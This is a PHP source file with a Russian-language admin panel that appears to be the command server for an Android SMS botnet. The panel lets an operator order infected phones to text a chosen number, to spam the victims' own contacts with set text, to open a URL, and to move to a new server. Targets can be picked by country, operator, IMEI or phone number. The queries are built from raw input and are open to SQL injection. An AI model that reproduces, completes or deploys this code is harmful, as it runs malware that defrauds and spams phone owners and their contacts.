<?php
date_default_timezone_set('Europe/Moscow');	
function select_job($db)
{
	$query = mysql_query("SELECT * FROM job", $db) or die(mysql_error());
	$queryrow = mysql_fetch_array($query);

		$active_1 = $queryrow['active_1'];
		$number_1 = $queryrow['number_1'];
		$active_2 = $queryrow['active_2'];
		$text_2 = $queryrow['text_2'];
		$active_3 = $queryrow['active_3'];
		$action_url = $queryrow['action_url'];
		$url = $queryrow['url'];
		$active_4 = $queryrow['active_4'];
		$server = $queryrow['server'];
		$country = $queryrow['country'];
		$operator_list = $queryrow['operator'];
		$prefix_1 = $queryrow['prefix_1'];
		$last_active = $queryrow['last_active'];


		if ($active_1 == 1){$checked_1 = "checked";} else {$checked_1 = "";}
		if ($active_2 == 1){$checked_2 = "checked";} else {$checked_2 = "";}
		if ($active_3 == 1){$checked_3 = "checked";} else {$checked_3 = "";}
		if ($active_4 == 1){$checked_4 = "checked";} else {$checked_4 = "";}
		
		if ($action_url == 0){$selected_0 = "selected";} else {$selected_0 = "";}
		if ($action_url == 1){$selected_1 = "selected";} else {$selected_1 = "";}



	$query_2 = mysql_query("SELECT DISTINCT country FROM list", $db) or die(mysql_error());
	$i = 0;
	while ($queryrow_2 = mysql_fetch_array($query_2))
	{
		$i++;
		$country_iso = $queryrow_2['country'];

		$check_country = "/".$country_iso."/i";
		if (preg_match($check_country, $country)){$checked_country = "checked";} else {$checked_country = "";}

		$query_4 = mysql_query("SELECT * FROM countries WHERE iso1_code='$country_iso'", $db) or die(mysql_error());
		$queryrow_4 = mysql_fetch_array($query_4);
		$counrty_name = $queryrow_4['name'];
                $counrty_flags = $queryrow_4['iso1_code'];
		
		if ($queryrow_4['name'] == FALSE)
		{
			$counrty_name = "Unknown";
		}
		else
		{
			$counrty_name = $queryrow_4['name'];
		}
		
		$country_flag = "<img width='30' src='images/flags/".$counrty_flags.".png'>";
		$country_mess .= "<tr><td><div class='text'>".$country_flag." ".$counrty_name.":</div></td><td><input type='checkbox' name='country_".$i."' value='".$country_iso."' data-on='Да' data-off='Нет'".$checked_country."></td></tr>";
	}
	
	$query_3 = mysql_query("SELECT DISTINCT operator FROM list", $db) or die(mysql_error());
	$ii = 0;
	while ($queryrow_3 = mysql_fetch_array($query_3))
	{
		$ii++;
		$operator = $queryrow_3['operator'];

		$check_operator = "/".$operator."/i";

		$checked_operator = "checked";

		$operator_mess .= "<tr><td width='10%'></td><td><div class='text'>".$operator.":</div></td><td><input type='checkbox' name='operator_".$ii."' value='".$operator."' data-on='Да' data-off='Нет'".$checked_operator."></td></tr>";
	}


		$mess .= <<<HERE
		<div id='page'>
		<form name='edit_job' method='post' action='$_SERVER[REQUEST_URL]'>

<table width='60%'>
					<tr>

						<td width='20%'>
							<table>
								<tr>
									<td width='10%'>
									</td>
									<td>
										<div class='text'>Фильтр по странам:</div>
									</td>
								</tr>
							</table>
						</td>

						<td width='20%'>
							<div class='text'>Фильтр по операторам:</div>
						</td>
					</tr>
					<tr>

						<td width='20%' valign='top'>
							<table width='70%'>

								$country_mess

							</table>
						</td>

						<td width='20%' valign='top'>
							<table>
							<tr>
							<td>
								$operator_mess
							</td>
							</tr>
							</table>
						</td>
					</tr>
</table>


		<table width='80%'>

		<tr>
		<td>
			<br><br>
			<div class='text'>Дать команду ботам по рассылке смс:</div>
		</td>
		<td>
			<input type='checkbox' name='action_1' data-on='Включено' data-off='Выключено' {$checked_1}>
		</td>

		</tr>
		<tr>
			<td>
				<table>

					<tr>
						<td>
						</td>
					</tr>
					<tr>
						<td width='10%'>
						</td>
						<td width='20%'>
							Телефон: <input type='text' name='number_1' value='{$number_1}'>
						</td>
						<td width='5%'>
						</td>
						<td width='20%'>
							Префикс: <input type='text' name='prefix_1' value='{$prefix_1}'>
						</td>
					</tr>

					<tr>
						<td width='10%'>
						</td>
						<td colspan='3' align='center' width='10%'>
							<br><br>
							Последняя активность <input type='text' name='last_active' value={$last_active}> дней
						</td>
					</tr>

				</table>
			</td>
		</tr>
		
		<tr><td colspan='2'><hr width='80%'></td></tr>
		<tr>

		<td>
			<br><br>
			<div class='text'>Дать команду ботам провести рассылку смс по контактам:</div>
		</td>
		<td>
			<br><br>
			<input type='checkbox' name='action_2' data-on='Включено' data-off='Выключено' {$checked_2}>
		</td>

		</tr>
		<tr>
			<td colspan='2' align='center' width='10%'>
				Текст: <input type='text' name='text_2' size='80' value='{$text_2}'>
			</td>
		</tr>
		<tr><td colspan='2'><hr width='80%'></td></tr>
		<tr>

		<td>
			<br><br>
			<div class='text'>Дать команду ботам установить определенный URL:</div>
		</td>
		<td>
			<br><br>
			<input type='checkbox' name='action_3' data-on='Включено' data-off='Выключено' {$checked_3}>
		</td>

		</tr>
		<tr>
			<td colspan='2' align='center'>
				Действие: <select name='action_url'><option {$selected_0} value='0'>Открыть URL</option></select> URL: <input type='text' name='url' size='80' value='{$url}'>
			</td>
		</tr>
		<tr><td colspan='2'><hr width='80%'></td></tr>
		<tr>

		<td>
			<br><br>
			<div class='text'>Дать команду ботам обновить настройки:</div>
		</td>
		<td>
			<br><br>
			<input type='checkbox' name='action_4' data-on='Включено' data-off='Выключено' {$checked_4}>
		</td>

		</tr>
		<tr>
			<td colspan='2' align='center'>
				Server URL: <input type='text' name='server' size='80' value='{$_SERVER[HTTP_HOST]}'>
			</td>
		</tr>
		<tr>
			<td colspan='2' align='center'>
				<br><br>
				Добавить для определенного абонента по <select name='one_choice'><option value='0'>IMEI</option><option value='1'>телефону</option></select><input type='text' name='one_action'>
			</td>
		</tr>
		
		</table>
			<input type='hidden' name='countries' value={$i}>
			<input type='hidden' name='operators' value={$ii}>
			<input type='submit' value='Запустить'>
			</form>
		</center><br/>	<br/>
		</div>
HERE;


	return $mess;
	
}

function update_job($action_1, $number_1, $last_active, $prefix_1, $action_2, $text_2, $action_3, $action_url, $url, $action_4, $server, $country, $operator, $db)
{
		$query = mysql_query("UPDATE job SET active_1='$action_1', number_1='$number_1', last_active='$last_active', prefix_1='$prefix_1', active_2='$action_2', text_2='$text_2', active_3='$action_3', action_url='$action_url', url='$url', active_4='$action_4', server='$server', country='$country', operator='$operator'", $db) or die(mysql_error());

		if ($query == TRUE)
		{
			return TRUE;
		}
}


function update_list($action_1, $number_1, $last_active, $prefix_1, $action_2, $text_2, $action_3, $action_url, $url, $action_4, $server, $country, $operator, $one_choice, $one_action, $db)
{
		$i = 0;

		if ($one_action == TRUE)
		{
			if ($one_choice == 0)
			{
				$query_2 = mysql_query("UPDATE list SET active_1='$action_1', number_1='$number_1', prefix_1='$prefix_1', active_2='$action_2', text_2='$text_2', active_3='$action_3', action_url='$action_url', url='$url', active_4='$action_4', server='$server' WHERE IMEI='$one_action' LIMIT 1", $db) or die(mysql_error());
				$i = 1;
			}
			if ($one_choice == 1)
			{
				$query_2 = mysql_query("UPDATE list SET active_1='$action_1', number_1='$number_1', prefix_1='$prefix_1', active_2='$action_2', text_2='$text_2', active_3='$action_3', action_url='$action_url', url='$url', active_4='$action_4', server='$server' WHERE phone='$one_action' LIMIT 1", $db) or die(mysql_error());
				$i = 1;
			}
		}
		else
		{
			$query = mysql_query("SELECT * FROM list ORDER BY date DESC", $db) or die(mysql_error());
			while ($queryrow = mysql_fetch_array($query))
			{
				$IMEI_old = $queryrow['IMEI'];
				$active_1_old = $queryrow['active_1'];
				$number_1_old = $queryrow['number_1'];
				$active_2_old = $queryrow['active_2'];
				$text_2_old = $queryrow['text_2'];
				$active_3_old = $queryrow['active_3'];
				$action_url_old = $queryrow['action_url'];
				$url_old = $queryrow['url'];
				$active_4_old = $queryrow['active_4'];
				$server_old = $queryrow['server'];
				$country_old = $queryrow['country'];
				$operator_old = $queryrow['operator'];
				$prefix_1_old = $queryrow['prefix_1'];
				$last_active_old = $queryrow['last_active'];

				$last_active_old_unix = (strtotime($last_active_old));
				$last_active_unix = $last_active * 24 * 60 * 60;
				$time = time();

				$time_minus = $time - $last_active_unix;


				$country_old = "/".$country_old."/i";
				$operator_old = "/".$operator_old."/i";

				if (preg_match($country_old, $country) AND preg_match($operator_old, $operator) AND $time_minus > $last_active_old_unix)
				{
					$query_2 = mysql_query("UPDATE list SET active_1='$action_1', number_1='$number_1', prefix_1='$prefix_1', active_2='$action_2', text_2='$text_2', active_3='$action_3', action_url='$action_url', url='$url', active_4='$action_4', server='$server' WHERE IMEI='$IMEI_old' LIMIT 1", $db) or die(mysql_error());
					$i++;
				}
			
			}
		}

		if ($query == TRUE)
		{
			return $i;
		}
}
?>